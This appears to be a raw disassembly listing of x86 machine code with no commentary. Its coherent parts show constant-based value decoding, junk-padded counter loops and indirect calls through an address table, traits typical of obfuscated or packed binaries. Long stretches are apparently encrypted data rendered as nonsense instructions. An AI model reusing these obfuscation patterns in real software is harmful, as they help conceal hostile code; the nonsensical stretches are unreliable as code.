  405234:	ret    0xfa45
  405237:	xor    bh,dh
  405239:	out    0xf9,al
  40523b:	cdq    
  40523c:	mov    dl,BYTE PTR [eax+0x35]
  40523f:	cmp    eax,0x5d0ff580
  405244:	add    DWORD PTR es:[esi],edi
  405247:	mov    bh,0x71
  405249:	lock jp 0x405241
  40524c:	lds    edx,FWORD PTR [eax+0x510854b9]
  405252:	pop    es
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	jg     0x4052db
  40527e:	cmc    
  40527f:	aam    0xc6
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x40525b
  405289:	cmc    
  40528a:	and    eax,0xcf4d3fe9
  40528f:	mov    gs,eax
  405291:	rcr    DWORD PTR [eax-0x27],cl
  405294:	sub    edi,DWORD PTR ss:[edx+0x18874bde]
  40529b:	dec    eax
  40529c:	cs in  al,dx
  40529e:	mov    dl,0xc4
  4052a0:	xchg   edx,eax
  4052a1:	mov    bl,0x27
  4052a3:	pop    ecx
  4052a4:	sahf   
  4052a5:	scas   eax,DWORD PTR es:[edi]
  4052a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a7:	xor    esi,DWORD PTR [edx]
  4052a9:	xor    DWORD PTR [ebx-0x3ac6539],esp
  4052af:	clc    
  4052b0:	cmc    
  4052b1:	mov    esp,0x3d946c5
  4052b6:	lods   al,BYTE PTR ds:[esi]
  4052b7:	inc    ecx
  4052b8:	call   0xa2775bde
  4052bd:	inc    ebx
  4052be:	and    al,0xcc
  4052c0:	mov    ds:0x6e014d44,al
  4052c5:	(bad)  
  4052c6:	mov    esi,0x84a84438
  4052cb:	out    0x8c,eax
  4052cd:	neg    BYTE PTR [esi]
  4052cf:	popa   
  4052d0:	hlt    
  4052d1:	xchg   edi,eax
  4052d2:	mov    ds:0xf1415d4b,eax
  4052d7:	push   ss
  4052d8:	cmp    BYTE PTR [eax+0x1b4029f7],bh
  4052de:	mov    eax,0x164d33b2
  4052e3:	adc    bl,al
  4052e5:	imul   ebx,esp,0x168255b
  4052eb:	fisubr WORD PTR [edx]
  4052ed:	mov    bl,0xd
  4052ef:	mov    al,ds:0x9f20c4b7
  4052f4:	and    WORD PTR [edi-0x7e],si
  4052f8:	(bad)  [esi]
  4052fa:	dec    edx
  4052fb:	aam    0xd2
  4052fd:	add    al,0x1f
  4052ff:	mov    edi,gs
  405301:	pop    ecx
  405302:	dec    edi
  405303:	or     ax,0xcbb3
  405307:	cmp    BYTE PTR [edx+0x7e5337b5],bh
  40530d:	mov    edi,?
  40530f:	(bad)  [ebx]
  405311:	out    0xa4,al
  405313:	inc    edi
  405314:	int3   
  405315:	es inc ebx
  405317:	or     DWORD PTR [edi+0x5a60c961],0x543e4d58
  405321:	or     dl,0xa7
  405324:	aad    0xca
  405326:	mov    ds:0x2b508ae8,eax
  40532b:	retf   
  40532c:	lods   al,BYTE PTR ds:[esi]
  40532d:	add    BYTE PTR [ebp+0x569498ac],cl
  405333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405334:	or     BYTE PTR [edi-0x49],dl
  405337:	push   ss
  405338:	xchg   BYTE PTR [ebp+0xf],dl
  40533b:	mov    dh,0x64
  40533e:	sub    BYTE PTR [eax-0x766d90c0],0xba
  405345:	sbb    al,0x24
  405347:	fs adc edi,edi
  40534a:	aas    
  40534b:	sahf   
  40534c:	test   BYTE PTR [esi+0x50],ah
  40534f:	cmp    BYTE PTR [eax],al
  405351:	repz dec ebp
  405353:	fisubr DWORD PTR [eax-0x58]
  405356:	sar    BYTE PTR [edx-0x8],1
  405359:	fs and eax,0x85205e53
  40535f:	pop    ds
  405360:	retf   0x92b3
  405363:	icebp  
  405364:	jecxz  0x4053c0
  405366:	mov    cl,0x90
  405368:	call   0x33b59ceb
  40536d:	std    
  40536e:	inc    edi
  40536f:	and    dl,BYTE PTR [eax+0x11bbbf9d]
  405375:	fisttp QWORD PTR [ecx]
  405377:	(bad)  
  405378:	push   0x5
  40537a:	mov    BYTE PTR [edi+ebp*4+0x5f02375b],0x40
  405382:	lods   al,BYTE PTR ds:[esi]
  405383:	addr16 jp 0x40539c
  405386:	dec    esp
  405387:	lods   al,BYTE PTR ds:[esi]
  405388:	cwde   
  405389:	xor    DWORD PTR [edi-0x26],0x97c72626
  405390:	or     BYTE PTR [esi+0x8],dh
  405393:	(bad)  
  405394:	call   0xe28:0xc734c79d
  40539b:	or     BYTE PTR [eax],0x19
  40539e:	sbb    eax,DWORD PTR [esi+0x3b]
  4053a1:	sar    ch,0x3d
  4053a4:	add    al,0x25
  4053a6:	neg    DWORD PTR [esi-0x6e]
  4053a9:	push   edi
  4053aa:	ss cs and al,0x25
  4053ae:	je     0x4053df
  4053b0:	sti    
  4053b1:	push   edx
  4053b2:	inc    edx
  4053b3:	rcr    ch,cl
  4053b5:	jle    0x4053db
  4053b7:	xchg   BYTE PTR [edx],bl
  4053b9:	shr    BYTE PTR [ecx+0x5f361dd9],0xdb
  4053c0:	inc    ecx
  4053c1:	push   ss
  4053c2:	fistp  DWORD PTR [eax]
  4053c4:	out    dx,al
  4053c5:	sti    
  4053c6:	sti    
  4053c7:	push   esi
  4053c8:	sub    BYTE PTR [eax],0x60
  4053cb:	fsub   DWORD PTR [eax-0x2]
  4053ce:	push   es
  4053cf:	icebp  
  4053d0:	dec    eax
  4053d1:	sub    al,0xdf
  4053d3:	sub    eax,0x54290755
  4053d8:	xchg   esp,eax
  4053d9:	out    0xec,eax
  4053db:	xor    eax,DWORD PTR [edx-0x618ef351]
  4053e1:	mov    ecx,0x1c02413f
  4053e6:	add    eax,0xa659983a
  4053eb:	ror    DWORD PTR [eax],cl
  4053ed:	popf   
  4053ee:	dec    ebx
  4053ef:	imul   ebp,edi,0x3b
  4053f2:	sbb    ebx,DWORD PTR [ebx-0x5a]
  4053f5:	fbstp  TBYTE PTR [ecx+0x30]
  4053f8:	jo     0x4053ed
  4053fa:	(bad)  
  4053fb:	mov    bl,0x69
  4053fd:	fdiv   DWORD PTR [ecx+eax*4+0x34]
  405401:	jg     0x405461
  405403:	dec    ebx
  405404:	icebp  
  405405:	sbb    DWORD PTR [edi-0x6fbb4ca1],edx
  40540b:	jle    0x4053bf
  40540d:	jle    0x4053c9
  40540f:	jmp    0x98f25270
  405414:	sar    BYTE PTR [eax+0x362336e8],0xeb
  40541b:	mov    edx,0xb959b0fa
  405420:	(bad)  
  405421:	stc    
  405422:	imul   ebx,DWORD PTR [ebp-0x7],0x3dea35ec
  405429:	mov    ebx,eax
  40542b:	push   cs
  40542c:	cwde   
  40542d:	cmp    BYTE PTR ds:0x1f69fc5e,dl
  405433:	xlat   BYTE PTR ds:[ebx]
  405434:	bound  edx,QWORD PTR [edx]
  405436:	xor    eax,0x5e3bc3ce
  40543b:	mov    ebx,0xe0cd8192
  405440:	xchg   DWORD PTR [edx+0x2d],ebx
  405443:	int    0xc0
  405445:	rol    DWORD PTR [edi+0x1a],0xce
  405449:	add    eax,esp
  40544b:	push   ecx
  40544c:	retf   0x2f15
  40544f:	cs mov cl,0x4b
  405452:	add    eax,0xf2fc038b
  405457:	clc    
  405458:	test   BYTE PTR [ebx],0xb3
  40545b:	push   cs
  40545c:	lods   al,BYTE PTR ds:[esi]
  40545d:	jbe    0x40548f
  40545f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405460:	xlat   BYTE PTR ds:[ebx]
  405461:	in     eax,dx
  405462:	add    al,0x21
  405464:	pop    ds
  405465:	mov    dh,BYTE PTR [ecx-0x6a]
  405468:	mov    cl,0x7c
  40546a:	ret    
  40546b:	xchg   ebx,eax
  40546c:	mov    al,0x69
  40546e:	(bad)  
  40546f:	shl    BYTE PTR [ebp+0x5],cl
  405472:	out    0x73,al
  405474:	ds das 
  405476:	push   DWORD PTR [ebx-0x77]
  405479:	inc    edx
  40547a:	or     BYTE PTR [ebx+0x558b1c45],cl
  405480:	adc    BYTE PTR [ecx+0x458b0c42],cl
  405486:	and    BYTE PTR [ebx+0x42891055],cl
  40548c:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x43035f
  4054d4:	sbb    DWORD PTR ds:0x4302c5,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x4302f1,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x4302d5,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x430363,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x4302d5,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x4302d5
  40552a:	inc    eax
  40552b:	mov    ds:0x4302d5,eax
  405530:	cmp    DWORD PTR ds:0x4302d5,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x4302d5,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ea97
  405555:	cmp    DWORD PTR ds:0x4302d5,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x4302d5
  405567:	inc    eax
  405568:	mov    ds:0x4302d5,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x4302f1,0x14
  40557c:	cmp    DWORD PTR ds:0x4302f1,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x4302f1,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42e923
  4055a2:	cmp    DWORD PTR ds:0x4302f1,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x4302f1
  4055b7:	dec    eax
  4055b8:	mov    ds:0x4302f1,eax
  4055bd:	mov    eax,ds:0x4302f1
  4055c2:	dec    eax
  4055c3:	mov    ds:0x4302f1,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42ec53,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x32a2c60a
  4055e5:	push   ecx
  4055e6:	nop
  4055e7:	fnsave [esi]
  4055e9:	sub    bh,BYTE PTR [esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x405597
  4055f1:	xchg   DWORD PTR [edi+0x6b803ef],esi
  4055f7:	push   esi
  4055f8:	sbb    BYTE PTR [eax],cl
  4055fa:	push   esp
  4055fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055fc:	sub    DWORD PTR [eax+0x68],0x8921fb4
  405603:	(bad)  
  405604:	lock pop esp
  405606:	in     eax,0x12
  405608:	sbb    al,0x1c
  40560a:	and    BYTE PTR [ebx-0x33b16202],0x2a
  405611:	push   edi
  405612:	test   eax,0xa23d233b
  405617:	inc    esi
  405618:	jecxz  0x4055cb
  40561a:	cs repnz daa 
  40561d:	mov    eax,0x7d21307f
  405622:	loopne 0x4055d7
  405624:	cs mov bh,0x9a
  405627:	in     eax,0x3f
  405629:	push   0x66e44e15
  40562e:	aam    0x22
  405630:	pop    esp
  405631:	adc    al,0x4
  405633:	mov    cl,0x34
  405635:	add    ebx,edx
  405637:	loopne 0x405670
  405639:	xchg   ecx,eax
  40563a:	repnz mov WORD PTR [edx-0x4c],?
  40563e:	test   DWORD PTR ds:0xb27cd9b5,edi
  405644:	stc    
  405645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405646:	push   es
  405647:	push   0x76
  405649:	cmc    
  40564a:	test   DWORD PTR [eax-0x32],eax
  40564d:	(bad)  
  40564e:	popa   
  40564f:	adc    al,0x97
  405651:	sub    BYTE PTR [ecx-0x75],dl
  405654:	fwait
  405655:	mov    dh,0x1d
  405657:	rcl    BYTE PTR [ebx],1
  405659:	adc    bl,bl
  40565b:	dec    ecx
  40565c:	pop    esi
  40565d:	test   eax,0x2bf34e0d
  405662:	mov    esi,0xf18fe4d4
  405667:	push   ss
  405668:	sahf   
  405669:	or     cl,cl
  40566b:	(bad)  
  40566c:	aam    0x2b
  40566e:	bound  esp,QWORD PTR ds:0xda637348
  405674:	sbb    dl,0x2a
  405677:	xor    al,0x8a
  405679:	ja     0x40565c
  40567b:	sbb    eax,0x3954d084
  405680:	sbb    al,0x59
  405682:	push   eax
  405683:	test   DWORD PTR [edi],esi
  405685:	retf   
  405686:	call   0x40469440
  40568b:	cmp    BYTE PTR [ebp-0x48],bl
  40568e:	sbb    bl,BYTE PTR [edi]
  405690:	push   ss
  405691:	mov    ecx,0xc45d4252
  405696:	xchg   esp,eax
  405697:	cmp    DWORD PTR [edi+0xbef681a],esp
  40569d:	sub    DWORD PTR [ecx],esp
  40569f:	dec    edx
  4056a0:	in     eax,dx
  4056a1:	inc    esi
  4056a2:	mov    edx,0xdbe6b64b
  4056a7:	push   es
  4056a8:	icebp  
  4056a9:	mov    WORD PTR ds:0xce3c09b8,?
  4056af:	push   ebp
  4056b0:	jmp    0x80e8:0x3879d267
  4056b7:	pushf  
  4056b8:	jae    0x40565e
  4056ba:	mov    esi,0xfe8c3c69
  4056bf:	mov    edi,0x1da94c3a
  4056c4:	jne    0x40571f
  4056c6:	dec    edx
  4056c7:	push   edi
  4056c8:	adc    DWORD PTR [edi],0x53
  4056cb:	push   0x6
  4056cd:	inc    ebp
  4056ce:	mov    dl,0x2f
  4056d0:	mov    sp,0xcce8
  4056d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d5:	test   eax,0xd8d48293
  4056da:	sub    eax,0xc114d903
  4056df:	add    eax,0xc6ede5f
  4056e4:	and    BYTE PTR [ecx+eax*2-0x29],bl
  4056e8:	lods   al,BYTE PTR ds:[esi]
  4056e9:	or     al,0x8c
  4056eb:	imul   ebx,ebp,0xbd6a6a3f
  4056f1:	xchg   edi,eax
  4056f2:	pop    ebp
  4056f3:	imul   edx,DWORD PTR [ecx-0x3e],0xd85bc8a5
  4056fa:	sbb    eax,0x938c1316
  4056ff:	jmp    0x43fea3fe
  405704:	ins    BYTE PTR es:[edi],dx
  405705:	xor    eax,ebp
  405707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405708:	jne    0x4056e1
  40570a:	pop    ecx
  40570b:	mov    bl,0x41
  40570d:	ret    0xb2a6
  405710:	dec    ebx
  405711:	outs   dx,BYTE PTR ds:[esi]
  405712:	cmp    eax,0xda3f6572
  405717:	mov    edx,0xd860037f
  40571c:	cmp    ch,BYTE PTR [eax]
  40571e:	mov    dl,0x9e
  405720:	lahf   
  405721:	dec    eax
  405722:	cmp    al,0x51
  405724:	or     eax,DWORD PTR [edi+edx*2-0x1978f6ab]
  40572b:	adc    DWORD PTR [ebp+edi*8-0x5c],edi
  40572f:	repz adc DWORD PTR [edx],esi
  405732:	xor    eax,0x11a63eec
  405737:	inc    edx
  405738:	mov    cl,0xc2
  40573a:	sti    
  40573b:	jnp    0x405793
  40573d:	lods   al,BYTE PTR ds:[esi]
  40573e:	pop    esp
  40573f:	sbb    ebx,DWORD PTR [ebx]
  405741:	repnz std 
  405743:	xchg   BYTE PTR [esi],bl
  405745:	sub    BYTE PTR [esi],0x94
  405748:	mov    edx,0x712735ac
  40574d:	dec    ebp
  40574e:	dec    ebx
  40574f:	int    0x81
  405751:	sbb    bl,BYTE PTR [edi]
  405753:	cdq    
  405754:	ss mov dh,BYTE PTR es:[edx-0x2f56ea1f]
  40575c:	dec    edx
  40575d:	ss jg  0x4057a8
  405760:	mov    ah,0x64
  405762:	inc    ebx
  405763:	xchg   ecx,eax
  405764:	rcr    BYTE PTR [edi+0x2d85db30],cl
  40576a:	mov    esp,0xab019259
  40576f:	cmc    
  405770:	mov    ah,0x1c
  405772:	out    dx,al
  405773:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  405775:	mov    dh,0x49
  405777:	jle    0x40575e
  405779:	inc    esi
  40577a:	bound  esi,QWORD PTR [edi]
  40577c:	clc    
  40577d:	gs sbb BYTE PTR fs:[ecx+0x13],ch
  405782:	jnp    0x40572b
  405784:	add    dl,BYTE PTR [ebx-0x73]
  405787:	jb     0x40579e
  405789:	push   ss
  40578a:	mov    al,BYTE PTR [ebx+0x50]
  40578d:	aad    0x57
  40578f:	dec    esp
  405790:	sti    
  405791:	clc    
  405792:	push   ss
  405793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405794:	inc    ecx
  405795:	jmp    0xf8272bc7
  40579a:	sub    eax,0x2b1b21df
  40579f:	mov    bl,ah
  4057a1:	adc    DWORD PTR [edx],0x8ac7aec2
  4057a7:	out    dx,eax
  4057a8:	or     al,0x4d
  4057aa:	push   ds
  4057ab:	ror    DWORD PTR [edx-0x78],1
  4057ae:	push   cs
  4057af:	enter  0x5c75,0x17
  4057b3:	arpl   WORD PTR [edi+0x3c],bx
  4057b6:	or     bl,BYTE PTR ds:0x33de00bf
  4057bc:	nop
  4057bd:	jmp    0xe6f0577b
  4057c2:	into   
  4057c3:	je     0x4057c1
  4057c5:	jle    0x4057da
  4057c7:	out    0x4d,eax
  4057c9:	outs   dx,DWORD PTR ds:[esi]
  4057ca:	leave  
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42ec5b,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42ec5b,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e857
  4057ff:	mov    eax,ds:0x42ec5b
  405804:	dec    eax
  405805:	mov    ds:0x42ec5b,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e648
  40581d:	or     DWORD PTR ds:0x4302c5,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x4302b9,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e654,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42ec6f
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42ec5b,0x1c
  405863:	cmp    DWORD PTR ds:0x42ec5b,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42ec5b,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e85b
  405886:	cmp    DWORD PTR ds:0x42ec5b,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42ec5b
  405898:	dec    eax
  405899:	mov    ds:0x42ec5b,eax
  40589e:	mov    eax,ds:0x42ec5b
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42ec5b,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x4302c1,0x42ec53
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x4302b5,0x42e644
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x430353,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x4302dd
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x4302bd
  4058ec:	xor    DWORD PTR ds:0x4302e1,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x4302d1,0x42ec6f
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x4302c1,0x42e648
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x4302c1
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42ec53,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42ec6b
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x4302e9,0x43036b
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x4302e9,0x42e648
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x430353
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x430353,0x42e654
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x4302bd,0x42ec5b
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42ec4f,0x42ec6b
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x4302d5
  405986:	sbb    eax,DWORD PTR ds:0x4302ed
  40598c:	mov    ds:0x4302d5,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	ins    DWORD PTR es:[edi],dx
  4059a3:	in     eax,0x8c
  4059a5:	pop    esi
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x40597f
  4059af:	fisttp WORD PTR [eax-0x43]
  4059b2:	cwde   
  4059b3:	mov    DWORD PTR [ebx-0x29],eax
  4059b6:	adc    ebp,DWORD PTR [edi]
  4059b8:	xor    DWORD PTR [esi+0x1bdb0843],0xffffffb6
  4059bf:	adc    BYTE PTR [ebp-0x29],0xb
  4059c3:	mov    dl,0x7e
  4059c5:	xchg   edi,eax
  4059c6:	mov    esp,DWORD PTR [edx-0x63]
  4059c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059ca:	pushf  
  4059cb:	xchg   ebp,esi
  4059cd:	aas    
  4059ce:	mov    eax,0xa84675e3
  4059d3:	cwde   
  4059d4:	add    edi,DWORD PTR [edi]
  4059d6:	dec    esp
  4059d7:	xor    eax,0xbe452a90
  4059dc:	xchg   BYTE PTR [ebx-0x67],bl
  4059df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059e1:	cwde   
  4059e2:	ds (bad) 
  4059e4:	mov    ebp,0x6b547e1d
  4059e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059ea:	xchg   esi,eax
  4059eb:	or     dl,BYTE PTR [edx+0xaf7118b]
  4059f1:	(bad)  
  4059f2:	push   ebp
  4059f3:	mov    eax,0x20d2438d
  4059f8:	out    0x8c,eax
  4059fa:	dec    ebp
  4059fb:	jbe    0x405a3e
  4059fd:	repz cmp dl,BYTE PTR ds:0xd180c4c9
  405a04:	fcomp  st(2)
  405a06:	lea    esi,[edi+0x19702165]
  405a0c:	lds    edi,FWORD PTR [eax]
  405a0e:	das    
  405a0f:	jbe    0x405a29
  405a11:	sub    al,0x74
  405a13:	leave  
  405a14:	fwait
  405a15:	cmc    
  405a16:	add    DWORD PTR [edi+0x21],ebp
  405a19:	mov    ah,0x1d
  405a1b:	sahf   
  405a1c:	jge    0x405a1e
  405a1e:	leave  
  405a1f:	test   DWORD PTR ds:0x37767148,0xd2e307d0
  405a29:	repnz xchg ebx,eax
  405a2b:	ret    
  405a2c:	mov    edx,0x5ce5bdfd
  405a31:	jnp    0x405a87
  405a33:	sbb    bl,BYTE PTR [esi]
  405a35:	bound  esp,QWORD PTR [ecx-0x69]
  405a38:	adc    bh,cl
  405a3a:	and    al,0xb3
  405a3c:	xchg   ah,dh
  405a3e:	cld    
  405a3f:	mov    al,0x2e
  405a41:	cwde   
  405a42:	test   BYTE PTR [ebp+ebp*1+0x640a6da8],bh
  405a49:	pop    edi
  405a4a:	bound  esi,QWORD PTR [eax]
  405a4c:	adc    DWORD PTR [edx+ebp*2],edx
  405a4f:	add    eax,0x27e77960
  405a54:	sub    eax,0x11f18f60
  405a59:	sbb    cl,dh
  405a5b:	dec    esp
  405a5c:	ins    DWORD PTR es:[edi],dx
  405a5d:	and    ebx,DWORD PTR [eax]
  405a5f:	sbb    DWORD PTR [edi-0x5a],ebp
  405a62:	gs fs push ecx
  405a65:	jle    0x405a17
  405a67:	shl    BYTE PTR [ecx-0x46],0x5e
  405a6b:	mov    al,ds:0xa46c571d
  405a70:	push   eax
  405a71:	(bad)  
  405a72:	cs pop ebx
  405a74:	gs pushfw 
  405a77:	xor    cl,dh
  405a79:	std    
  405a7a:	mov    edx,0x66ef988
  405a7f:	cmc    
  405a80:	pop    ebx
  405a81:	mov    al,ds:0xbde056c1
  405a86:	pop    ebx
  405a87:	and    DWORD PTR [esi+eiz*8-0x21],0x2fd21eea
  405a8f:	xchg   edi,eax
  405a90:	int    0xf4
  405a92:	scas   al,BYTE PTR es:[edi]
  405a93:	aad    0xc4
  405a95:	repnz pop ds
  405a97:	pop    edx
  405a98:	scas   al,BYTE PTR es:[di]
  405a9a:	test   bh,ah
  405a9c:	push   ecx
  405a9d:	popf   
  405a9e:	mov    BYTE PTR [ebx+eax*2-0x523d5081],ch
  405aa5:	push   edx
  405aa6:	sub    al,0xc
  405aa8:	popf   
  405aa9:	jmp    0x9146fd88
  405aae:	lods   eax,DWORD PTR ds:[esi]
  405aaf:	sar    edi,cl
  405ab1:	dec    edi
  405ab2:	dec    edx
  405ab3:	cmp    dh,dh
  405ab5:	shr    BYTE PTR [ebx+0x201ab38d],cl
  405abb:	mov    DWORD PTR [edi+esi*8-0x44],edi
  405abf:	(bad)  
  405ac0:	and    ebx,DWORD PTR [ebx]
  405ac2:	call   0xb61:0x4a15d7c7
  405ac9:	(bad)  
  405aca:	mov    ebp,0x97ebfda6
  405acf:	in     eax,dx
  405ad0:	jg     0x405b30
  405ad2:	inc    ebp
  405ad3:	ss int3 
  405ad5:	xor    bl,BYTE PTR [ecx-0x15a641a0]
  405adb:	aad    0xf9
  405add:	les    esp,FWORD PTR ds:0xd022d963
  405ae3:	pop    edi
  405ae4:	aam    0x48
  405ae6:	int3   
  405ae7:	push   ebp
  405ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aea:	jecxz  0x405aed
  405aec:	sub    al,0x4d
  405aee:	inc    ecx
  405aef:	arpl   WORD PTR [eax-0x6f0c5226],si
  405af5:	outs   dx,DWORD PTR ds:[esi]
  405af6:	je     0x405b1b
  405af8:	fidivr WORD PTR [esi]
  405afa:	into   
  405afb:	gs sub eax,0x20b4b75a
  405b01:	out    0xc5,al
  405b03:	pop    eax
  405b04:	add    ecx,ebp
  405b06:	out    dx,eax
  405b07:	mov    ds:0x79dca064,eax
  405b0c:	aad    0xdc
  405b0e:	sub    al,0x37
  405b10:	push   ebx
  405b11:	repnz das 
  405b13:	stc    
  405b14:	sub    dh,dl
  405b16:	pushf  
  405b17:	mov    ss,WORD PTR [esi]
  405b19:	les    edx,FWORD PTR [edx]
  405b1b:	adc    ecx,DWORD PTR [edx]
  405b1d:	xor    eax,0x1fa1e73c
  405b22:	push   ebp
  405b23:	jb     0x405abf
  405b25:	sub    DWORD PTR [ecx+0x62cf7cbd],esp
  405b2b:	or     BYTE PTR [edx],0x3e
  405b2e:	(bad)  
  405b32:	int3   
  405b33:	xchg   esp,eax
  405b34:	sbb    DWORD PTR [edi],esp
  405b36:	popf   
  405b37:	pop    ecx
  405b38:	sti    
  405b39:	inc    esi
  405b3a:	aaa    
  405b3b:	push   ds
  405b3c:	push   es
